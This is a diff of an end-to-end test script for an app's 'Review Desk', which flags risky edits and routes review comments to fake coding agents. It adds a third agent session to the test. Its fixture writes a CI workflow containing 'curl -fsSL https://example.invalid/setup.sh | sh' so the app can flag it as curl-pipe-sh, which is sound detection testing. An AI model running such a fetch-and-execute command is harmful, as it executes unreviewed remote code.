@@ -1,20 +1,25 @@
 #!/usr/bin/env node
 // Scenario: F21 — the Review Desk (⌘G) on the REAL app, with two fake agents.
 //
-// A throwaway repository on branch hermes/task carries two "turns" of
+// A throwaway repository on branch hermes/task carries three "turns" of
 // uncommitted work: Agent A changed src/app.js (turn 1), Agent B changed
-// src/util.js, package-lock.json and .github/workflows/ci.yml (turn 2).
-// Both agents are the fake vendor CLI (tools/fake-agents/fake-cli.mjs)
-// started through `hi run` as `claude`, in the same folder; the turn ledger
-// (F20) is not filled yet, so the turns are injected through the test
-// bridge with exactly the patches git produced.
+// src/util.js, package-lock.json and .github/workflows/ci.yml (turn 2),
+// Agent C changed README.md (turn 3). All three are the fake vendor CLI
+// (tools/fake-agents/fake-cli.mjs) started through `hi run`: A and B as
+// `claude` (a vendor whose launch installs a prompt hook), C as a vendor
+// whose launch installs none — the first of GitHub Copilot CLI, Aider and
+// Gemini CLI whose real binary is NOT on this machine, so the fake can
+// never be shadowed by a real CLI (a login shell's path_helper puts the
+// system folders ahead of the fake's) — all in the same folder; the turn
+// ledger (F20) is not filled yet, so the turns are injected through the
+// test bridge with exactly the patches git produced.
 //
 //   run 1  fresh install: the command palette's ⌘G entry is "Toggle Git
 //          Panel"; the launchHelper and reviewDesk flags are turned on
 //   run 2  relaunch:
 //          - the ⌘G menu route opens the Review Desk, the palette entry
 //            reads "Review Desk", and no git panel is mounted
-//          - by file: four changed files; the lockfile and the workflow
+//          - by file: five changed files; the lockfile and the workflow
 //            carry risk flags, src/app.js carries none
 //          - a viewed checkbox survives closing and reopening the desk
 //          - by turn: T1 (Agent A) and T2 (Agent B); a comment on a line of
@@ -26,16 +31,21 @@
 //            arrives in B's terminal, nothing comes back, Hermes shows
 //            "not delivered" with Retry; Retry pastes the same line again
 //          - Send to Agent A while it is on a turn: nothing is typed into
-//            it; Hermes shows the send as waiting, and pastes the line only
-//            once A's turn ends (its Stop hook), then shows "delivered"
+//            it, not even once A's turn ends (its Stop hook) — Hermes shows
+//            the send as waiting with "Send now" off while A works and on
+//            afterwards; only that second press pastes the line, and then
+//            Hermes shows "delivered"
+//          - Send to Agent C (a vendor whose launch installs no prompt
+//            hook): the line arrives in C's terminal and Hermes shows
+//            "pasted — cannot confirm" (no Retry), not "not delivered"
 //          - Revert turn 2: the preview lists its three files and applies
 //            cleanly; afterwards those files are back at the base and
-//            src/app.js still has turn 1's change
+//            src/app.js and README.md still have turns 1 and 3
 //
 // Negative control: HERMES_E2E_F21_RISK_FILE=src/app.js (expect a risk flag
 // on a plain edit) must end in RESULT: FAIL.
 //
-// Windows: the fake `claude` has to be on the user's registry Path (see
+// Windows: the fake `claude` and the fake vendor C have to be on the user's registry Path (see
 // N12); that is only changed on a CI runner, so outside CI this scenario
 // reports RESULT: SKIP there.
 //
@@ -113,19 +123,44 @@ write("src/util.js", "export function twice(x) {\n  return x + x;\n}\nexport con
 write("package-lock.json", '{\n  "name": "f21-fixture",\n  "lockfileVersion": 3,\n  "packages": {\n    "node_modules/left-pad": { "version": "1.3.0" }\n  }\n}\n');
 write(".github/workflows/ci.yml", "name: ci\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n      - run: curl -fsSL https://example.invalid/setup.sh | sh\n");
 const patch2 = git("diff", "--", "src/util.js", "package-lock.json", ".github/workflows/ci.yml");
-assert(patch1.includes("+const b = 3;") && patch2.includes("+export const answer"), "the fixture's two turn patches are real git diffs");
+// Turn 3 (Agent C): the README.
+write("README.md", "# f21 fixture\n\nRun `npm test` before pushing.\n");
+const patch3 = git("diff", "--", "README.md");
+assert(patch1.includes("+const b = 3;") && patch2.includes("+export const answer") && patch3.includes("+Run `npm test`"), "the fixture's three turn patches are real git diffs");
 
-// ─── A fake `claude` on PATH (the same arrangement as N12) ───────────
+// ─── A fake `claude` and a fake vendor C on PATH (the same arrangement as N12) ──
 
 const FAKE_CLI = join(REPO_ROOT, "tools", "fake-agents", "fake-cli.mjs");
-if (onWindows) {
-  writeFileSync(join(fakeBin, "claude.cmd"), `@"${process.execPath}" "${FAKE_CLI}" %*\r\n`);
-} else {
-  writeFileSync(join(fakeBin, "claude"), `#!/bin/sh\nexec "${process.execPath}" "${FAKE_CLI}" "$@"\n`);
-  chmodSync(join(fakeBin, "claude"), 0o755);
+/** Vendors whose launch installs no prompt hook (src-tauri/src/pty/launch.rs), by card title and binary. */
+const VENDOR_C_CANDIDATES = [
+  { id: "copilot", card: "GitHub Copilot CLI", bin: "copilot" },
+  { id: "aider", card: "Aider", bin: "aider" },
+  { id: "gemini", card: "Gemini CLI", bin: "gemini" },
+];
+const systemDirs = onWindows ? [] : ["/usr/local/bin", "/opt/homebrew/bin", "/opt/local/bin", "/usr/bin", "/bin"];
+const realBinaryOf = (bin) =>
+  [...(process.env.PATH || "").split(delimiter), ...systemDirs]
+    .filter(Boolean)
+    .flatMap((d) => [bin, `${bin}.exe`, `${bin}.cmd`].map((n) => join(d, n)))
+    .find((p) => existsSync(p)) ?? null;
+const VENDOR_C = VENDOR_C_CANDIDATES.find((v) => !realBinaryOf(v.bin));
+if (!VENDOR_C) {
+  log(`every no-prompt-hook vendor (${VENDOR_C_CANDIDATES.map((v) => v.bin).join(", ")}) is really installed here; a real CLI must never be started by a test`);
+  log("RESULT: SKIP (no vendor free for the fake)");
+  rmSync(work, { recursive: true, force: true });
+  process.exit(0);
 }
-const hasRealClaude = (dir) => ["claude", "claude.exe", "claude.cmd"].some((n) => existsSync(join(dir, n)));
-process.env.PATH = [fakeBin, ...(process.env.PATH || "").split(delimiter).filter((d) => d && !hasRealClaude(d))].join(delimiter);
+const FAKE_NAMES = ["claude", VENDOR_C.bin];
+for (const name of FAKE_NAMES) {
+  if (onWindows) {
+    writeFileSync(join(fakeBin, `${name}.cmd`), `@"${process.execPath}" "${FAKE_CLI}" %*\r\n`);
+  } else {
+    writeFileSync(join(fakeBin, name), `#!/bin/sh\nexec "${process.execPath}" "${FAKE_CLI}" "$@"\n`);
+    chmodSync(join(fakeBin, name), 0o755);
+  }
+}
+const hasRealAgent = (dir) => FAKE_NAMES.some((name) => [name, `${name}.exe`, `${name}.cmd`].some((n) => existsSync(join(dir, n))));
+process.env.PATH = [fakeBin, ...(process.env.PATH || "").split(delimiter).filter((d) => d && !hasRealAgent(d))].join(delimiter);
 for (const name of Object.keys(process.env)) if (name.startsWith("ANTHROPIC_")) delete process.env[name];
 
 const canEditRegistryPath = onWindows && process.env.GITHUB_ACTIONS === "true";
@@ -265,19 +300,20 @@ async function clickPrimary(bridge, what) {
 }
 
 /**
- * New Session wizard: a Claude session (the fake, through `hi run`) in the
- * fixture repository, named `label`. The second session on the same branch
- * picks "Use current branch" (the branch is already taken by the first).
+ * New Session wizard: an agent session (the fake, through `hi run`) in the
+ * fixture repository, named `label`, from the vendor card whose title starts
+ * with `card`. A later session on the same branch picks "Use current
+ * branch" (the branch is already taken by the first).
  */
-async function createAgentSession(bridge, label) {
+async function createAgentSession(bridge, label, card = "Claude") {
   const before = await bridge.terminalIds();
   if (await bridge.exists("button.es-tile-primary")) await bridge.click("button.es-tile-primary");
   else await bridge.click(".activity-bar-action");
   await bridge.waitFor("the New Session wizard", `return !!e2e.first(".session-creator");`, { timeoutMs: 20_000 });
   await bridge.waitFor("the agent picker", `return e2e.all(".session-creator-provider-card").length > 0;`, { timeoutMs: 20_000 });
   await bridge.clickWhenReady(`
-    const card = e2e.all(".session-creator-provider-card").find((c) => c.innerText.trim().startsWith("Claude"));
-    return e2e.click(e2e.must(card, "the Claude card"));
+    const card = e2e.all(".session-creator-provider-card").find((c) => c.innerText.trim().startsWith(${JSON.stringify(card)}));
+    return e2e.click(e2e.must(card, "the ${card} card"));
   `);
   await bridge.eval(`
     const box = e2e.first(".session-creator-agent-view input[type=checkbox]");
@@ -441,7 +477,7 @@ async function quit(current) {
 let app;
 let failed = false;
 try {
-  log(`scenario: ${SCENARIO}   platform: ${platform()}   repo: ${repo}   risk file: ${RISK_FILE}`);
+  log(`scenario: ${SCENARIO}   platform: ${platform()}   repo: ${repo}   risk file: ${RISK_FILE}   vendor C: ${VENDOR_C.id}`);
   undoRegistryPath = addFakeBinToRegistryPath();
   setFakeMode("prompts");
 
@@ -469,10 +505,15 @@ try {
   setFakeMode("prompts no-prompt-hooks");
   const idB = await createAgentSession(bridge, "Agent B");
   log(`  Agent B: ${idB}`);
-  assert(idA !== idB, "two sessions");
+  setFakeMode("prompts");
+  const idC = await createAgentSession(bridge, "Agent C", VENDOR_C.card);
+  log(`  Agent C: ${idC} (${VENDOR_C.card}, the fake ${VENDOR_C.bin})`);
+  assert(new Set([idA, idB, idC]).size === 3, "three sessions");
   const recA0 = recordOf(idA);
   const recB0 = recordOf(idB);
-  assert(recA0?.mode === "prompts" && recB0?.mode === "prompts no-prompt-hooks", "Agent A reports prompts through its hook; Agent B is a vendor without one");
+  const recC0 = recordOf(idC);
+  assert(recA0?.mode === "prompts" && recB0?.mode === "prompts no-prompt-hooks", "Agent A reports prompts through its hook; Agent B is a Claude that never runs it");
+  assert(recC0?.env?.HERMES_AGENT === VENDOR_C.id && !recC0.settingsFile, `Agent C was started as ${VENDOR_C.id}, with no hook settings file (${JSON.stringify(recC0?.argv ?? null)})`);
 
   log("step 1: inject the two turns (what the ledger will record) and open the desk through the ⌘G menu route");
   const injected = await bridge.eval(`
@@ -480,20 +521,21 @@ try {
     const mk = (sid, n, startedAt, files, ins, del) => ({ sessionId: sid, n, ref: "refs/hermes/" + sid + "/turn/" + n, startedAt, endedAt: startedAt + 1000, diffstat: { files, insertions: ins, deletions: del } });
     H.injectTurns(${JSON.stringify(idA)}, [{ turn: mk(${JSON.stringify(idA)}, 1, 1790000000000, 1, 1, 1), patch: ${JSON.stringify(patch1)} }]);
     H.injectTurns(${JSON.stringify(idB)}, [{ turn: mk(${JSON.stringify(idB)}, 2, 1790000010000, 3, 4, 2), patch: ${JSON.stringify(patch2)} }]);
+    H.injectTurns(${JSON.stringify(idC)}, [{ turn: mk(${JSON.stringify(idC)}, 3, 1790000020000, 1, 2, 0), patch: ${JSON.stringify(patch3)} }]);
     return true;
   `);
-  assert(injected === true, "turns injected: T1 for Agent A, T2 for Agent B");
+  assert(injected === true, "turns injected: T1 for Agent A, T2 for Agent B, T3 for Agent C");
   await selectSession(bridge, "Agent A");
   await openDesk(bridge, "menu");
   assert(!(await bridge.exists(".session-git-panel")) && !(await bridge.exists(".git-panel")), "no other git panel is mounted");
   const scope = await bridge.eval(`return { repo: e2e.first(".review-desk").getAttribute("data-repo"), head: e2e.norm(e2e.first(".review-scope")?.textContent) };`);
   assert(sameFolder(scope.repo, repo) && /hermes\/task → main/.test(scope.head), `the desk reviews the fixture repository on hermes/task against main ("${scope.head}")`);
 
-  log("step 2: by file — four changed files with risk flags on the lockfile and the workflow");
+  log("step 2: by file — five changed files with risk flags on the lockfile and the workflow");
   const rows = await fileRows(bridge);
   log(`  files: ${JSON.stringify(rows)}`);
   const paths = rows.map((r) => r.path).sort();
-  assert(JSON.stringify(paths) === JSON.stringify([".github/workflows/ci.yml", "package-lock.json", "src/app.js", "src/util.js"]), "the by-file list holds exactly the four changed files");
+  assert(JSON.stringify(paths) === JSON.stringify([".github/workflows/ci.yml", "README.md", "package-lock.json", "src/app.js", "src/util.js"]), "the by-file list holds exactly the five changed files");
   const riskRow = rows.find((r) => r.path === RISK_FILE);
   assert(riskRow && riskRow.flags.length > 0, `${RISK_FILE} carries a risk flag (${riskRow?.flags.join(", ")})`);
   assert(rows.find((r) => r.path === "package-lock.json")?.flags.includes("lockfile"), "the lockfile change is flagged as a lockfile");
@@ -501,7 +543,7 @@ try {
   assert(wf.includes("workflow") && wf.includes("curl_pipe_sh"), `the workflow edit is flagged as a workflow and as curl | sh (${wf.join(", ")})`);
   assert(rows.find((r) => r.path === "src/app.js")?.flags.length === 0, "a plain source edit carries no flag");
   const summary = await bridge.eval(`const s = e2e.first(".review-summary"); return { files: Number(s.getAttribute("data-files")), flags: Number(s.getAttribute("data-flags")), viewed: Number(s.getAttribute("data-viewed")) };`);
-  assert(summary.files === 4 && summary.flags >= 3 && summary.viewed === 0, `the summary counts 4 files, ${summary.flags} flags, 0 viewed`);
+  assert(summary.files === 5 && summary.flags >= 3 && summary.viewed === 0, `the summary counts 5 files, ${summary.flags} flags, 0 viewed`);
   await bridge.screenshot(join(evidenceDir, "01-by-file-with-flags.png"));
 
   log("step 3: viewed checkbox — ticked, kept across closing and reopening the desk; j/k move the selection");
@@ -518,13 +560,14 @@ try {
   await openDesk(bridge, "sidebar");
   assert((await fileRows(bridge)).find((r) => r.path === "src/app.js")?.viewed === true, "src/app.js is still ticked after reopening from the sidebar button");
 
-  log("step 4: by turn — T1 is Agent A's, T2 is Agent B's; comments are routed to the agent that made the turn");
+  log("step 4: by turn — T1 is Agent A's, T2 is Agent B's, T3 is Agent C's; comments are routed to the agent that made the turn");
   await bridge.click('.review-group-btn[data-group="turn"]');
-  await bridge.waitFor("the turn list", `return e2e.all(".review-turn-row").length === 2;`);
+  await bridge.waitFor("the turn list", `return e2e.all(".review-turn-row").length === 3;`);
   const turns = await turnRows(bridge);
   log(`  turns: ${JSON.stringify(turns)}`);
   assert(turns[0].n === 1 && turns[0].session === idA && turns[0].agent === "Agent A", "T1 belongs to Agent A");
   assert(turns[1].n === 2 && turns[1].session === idB && turns[1].agent === "Agent B", "T2 belongs to Agent B");
+  assert(turns[2].n === 3 && turns[2].session === idC && turns[2].agent === "Agent C", "T3 belongs to Agent C");
   await bridge.click(`.review-turn-row[data-turn="2"]`);
   await bridge.waitFor("turn 2's files", `return e2e.all(".review-turn-file").length === 3;`);
   const c1 = await commentOn(bridge, "src/util.js", "Please do not use eval here; parse the number instead.");
@@ -554,7 +597,7 @@ try {
   const spoolA = readFileSync(recordOf(idA).env.HERMES_SIGNAL_FILE, "utf8");
   assert(spoolA.includes('"hermes_tags":["hermes-review#1"]'), "the spool line for the prompt carries the marker as hermes_tags");
   assert(!spoolA.includes("Please read the review") && !spoolA.includes('"prompt"'), "no prompt text reaches the on-disk spool");
-  assert(((recordOf(idB) ?? {}).prompts ?? []).length === 0, "Agent B's terminal received nothing");
+  assert(((recordOf(idB) ?? {}).prompts ?? []).length === 0 && ((recordOf(idC) ?? {}).prompts ?? []).length === 0, "Agent B's and Agent C's terminals received nothing");
   await bridge.screenshot(join(evidenceDir, "03-delivered-to-agent-a.png"));
 
   log("step 6: Send to Agent B — the line arrives, no signal comes back, Hermes shows not delivered with Retry");
@@ -586,7 +629,7 @@ try {
   const promptsB2 = await waitForPrompts(idB, 2);
   assert(promptsB2[1] === promptsB2[0], "Retry pasted the same tagged line again");
 
-  log("step 6b: Send to Agent A while it works — nothing is typed into a busy agent; the line goes out when its turn ends");
+  log("step 6b: Send to Agent A while it works — nothing is typed into a busy agent, not even when its turn ends; only Send now pastes");
   await bridge.click(`.review-turn-row[data-turn="1"]`);
   await bridge.waitFor("turn 1's file", `return e2e.all(".review-turn-file").length === 1;`);
   const c3 = await commentOn(bridge, "src/app.js", "Add a comment saying why it is 3.");
@@ -602,21 +645,49 @@ try {
   log(`  Agent A: ${JSON.stringify(busyA)}`);
   const promptsBefore = (await waitForPrompts(idA, 2)).length;
   await bridge.click(`.review-send[data-session="${idA}"] .review-send-btn`);
+  const sendNowState = (bridge) => bridge.eval(`
+    const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "3");
+    if (!d) return null;
+    const b = d.querySelector(".review-send-now-btn");
+    return { state: d.getAttribute("data-state"), text: e2e.norm(d.textContent), sendNow: b ? { disabled: b.disabled, busy: b.getAttribute("data-busy") } : null };
+  `);
   const waiting = await bridge.waitFor("the send to wait for the turn", `
     const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "3" && el.getAttribute("data-state") === "waiting");
     return d ? e2e.norm(d.textContent) : null;
   `, { timeoutMs: 5_000 });
   log(`  Hermes shows "${waiting}"`);
+  const whileWorking = await sendNowState(bridge);
+  assert(whileWorking.sendNow && whileWorking.sendNow.disabled === true, `Send now is off while Agent A works (${JSON.stringify(whileWorking.sendNow)})`);
   await sleep(2_000);
   assert((recordOf(idA).prompts ?? []).length === promptsBefore, "while Agent A worked, nothing was typed into it");
   assert(!(await bridge.exists(".review-delivery[data-n='3'][data-state='delivered']")), "review 3 is not delivered yet");
-  const deliveredA3 = await bridge.waitFor("delivery of review 3 once the turn ended", `
+  // The turn ends (the fake's Stop hook): Hermes still types nothing by itself.
+  const endedA = await bridge.waitFor("Agent A's turn to end", `
+    const s = window.__HERMES_E2E__.sessionEventSnapshot(${JSON.stringify(idA)});
+    return s.status.kind !== "working" ? s.status : null;
+  `, { timeoutMs: 20_000 });
+  log(`  Agent A after its turn: ${JSON.stringify(endedA)}`);
+  const sendNowOn = await bridge.waitFor("Send now to come on once the turn ended", `
+    const b = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "3")?.querySelector(".review-send-now-btn");
+    return b && !b.disabled ? true : null;
+  `, { timeoutMs: 5_000 });
+  assert(sendNowOn === true, "Send now is on once Agent A's turn ended");
+  await sleep(1_500);
+  const afterTurn = await sendNowState(bridge);
+  assert(afterTurn.state === "waiting", `review 3 still waits for the person after the turn (${afterTurn.state})`);
+  assert((recordOf(idA).prompts ?? []).length === promptsBefore, "after the turn ended, Hermes still typed nothing into Agent A on its own");
+  await bridge.screenshot(join(evidenceDir, "04b-waiting-send-now.png"));
+  await bridge.clickWhenReady(`
+    const b = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "3")?.querySelector(".review-send-now-btn");
+    return e2e.click(e2e.must(b, "the Send now button"));
+  `);
+  const deliveredA3 = await bridge.waitFor("delivery of review 3 after Send now", `
     const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "3");
     return d && d.getAttribute("data-state") === "delivered" ? e2e.norm(d.textContent) : null;
-  `, { timeoutMs: 20_000 });
+  `, { timeoutMs: 15_000 });
   log(`  Hermes shows "${deliveredA3}"`);
   const promptsA3 = await waitForPrompts(idA, promptsBefore + 1);
-  assert(promptsA3[promptsBefore].startsWith("[hermes-review #3] "), "the tagged line for review 3 reached Agent A after its turn");
+  assert(promptsA3.length === promptsBefore + 1 && promptsA3[promptsBefore].startsWith("[hermes-review #3] "), "exactly one tagged line for review 3 reached Agent A, on Send now");
   const evs = recordOf(idA).events ?? [];
   const iWork = evs.findIndex((e) => e.ev === "working");
   const iEnd = evs.findIndex((e, i) => i > iWork && e.ev === "turn-end");
@@ -624,9 +695,29 @@ try {
   assert(iWork >= 0 && iEnd > iWork && iLine > iEnd, `the fake read the line only after its turn ended (working@${iWork}, turn-end@${iEnd}, prompt@${iLine})`);
   const afterA = await statusOf(bridge, idA);
   log(`  Agent A after the receipt: ${JSON.stringify(afterA)}`);
-  await bridge.screenshot(join(evidenceDir, "04b-waited-for-the-turn.png"));
+  await bridge.screenshot(join(evidenceDir, "04c-sent-now-after-the-turn.png"));
 
-  log("step 7: revert turn 2 — preview, apply, and turn 1 stays intact");
+  log("step 6c: Send to Agent C — a vendor whose launch installs no prompt hook: the line arrives, Hermes says pasted (cannot confirm), not not-delivered");
+  await bridge.click(`.review-turn-row[data-turn="3"]`);
+  await bridge.waitFor("turn 3's file", `return e2e.all(".review-turn-file").length === 1;`);
+  const c4 = await commentOn(bridge, "README.md", "Say which test command exactly.");
+  assert(c4.session === idC && c4.turn === 3 && /to Agent C/.test(c4.route), `the comment on turn 3's line is routed to Agent C (${c4.route})`);
+  await bridge.click(`.review-send[data-session="${idC}"] .review-send-btn`);
+  const pastedC = await bridge.waitFor("the pasted outcome for Agent C", `
+    const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "4");
+    return d && d.getAttribute("data-state") === "pasted" ? { text: e2e.norm(d.textContent), retry: !!d.querySelector(".review-retry-btn"), copy: !!d.querySelector(".review-copy-line-btn") } : null;
+  `, { timeoutMs: 15_000 });
+  assert(!pastedC.retry && pastedC.copy, `Hermes shows "${pastedC.text}" with Copy line and no Retry`);
+  const promptsC = await waitForPrompts(idC, 1);
+  assert(promptsC.length === 1 && promptsC[0].startsWith("[hermes-review #4] "), "the tagged line reached Agent C's terminal once");
+  // The fake records the event even with nothing to run: what matters is that no hook command ran.
+  assert(!(recordOf(idC).hooksRan ?? []).some((h) => h.event === "UserPromptSubmit" && (h.results ?? []).length > 0), "Agent C ran no prompt hook command (none was installed)");
+  await sleep(6_000);
+  const stillPasted = await bridge.eval(`return e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "4")?.getAttribute("data-state");`);
+  assert(stillPasted === "pasted", `after the receipt window review 4 still reads pasted, never not-delivered (${stillPasted})`);
+  await bridge.screenshot(join(evidenceDir, "04d-pasted-cannot-confirm.png"));
+
+  log("step 7: revert turn 2 — preview, apply, and turns 1 and 3 stay intact");
   await bridge.click(`.review-turn-row[data-turn="2"]`);
   await bridge.waitFor("turn 2 selected", `return e2e.first('.review-turn-row[data-turn="2"]')?.classList.contains("review-row-selected");`);
   await bridge.click(".review-revert-btn");
@@ -644,11 +735,15 @@ try {
   assert(read("package-lock.json") === BASE["package-lock.json"], "package-lock.json is back at the base");
   assert(read(".github/workflows/ci.yml") === BASE[".github/workflows/ci.yml"], "the workflow is back at the base");
   assert(read("src/app.js") === "const a = 1;\nconst b = 3;\nexport default a + b;\n", "turn 1's change to src/app.js is intact");
-  const status = git("status", "--porcelain");
-  assert(status.trimEnd() === " M src/app.js", `git status shows only turn 1's file (${JSON.stringify(status.trimEnd())})`);
+  assert(read("README.md").includes("Run `npm test`"), "turn 3's change to README.md is intact");
+  const status = git("status", "--porcelain").trimEnd().split(/\r?\n/).sort();
+  assert(JSON.stringify(status) === JSON.stringify([" M README.md", " M src/app.js"]), `git status shows only turns 1 and 3 (${JSON.stringify(status)})`);
   await bridge.click('.review-group-btn[data-group="file"]');
-  await bridge.waitFor("the by-file list to shrink to one file", `return e2e.all(".review-file-row").length === 1 && e2e.first(".review-file-row").getAttribute("data-path") === "src/app.js";`, { timeoutMs: 15_000 });
-  assert(true, "the desk now lists only src/app.js");
+  await bridge.waitFor("the by-file list to shrink to two files", `
+    const p = e2e.all(".review-file-row").map((r) => r.getAttribute("data-path")).sort();
+    return p.length === 2 && p[0] === "README.md" && p[1] === "src/app.js";
+  `, { timeoutMs: 15_000 });
+  assert(true, "the desk now lists only README.md and src/app.js");
   await bridge.screenshot(join(evidenceDir, "06-after-revert.png"));
   await closeDesk(bridge);
 } catch (e) {
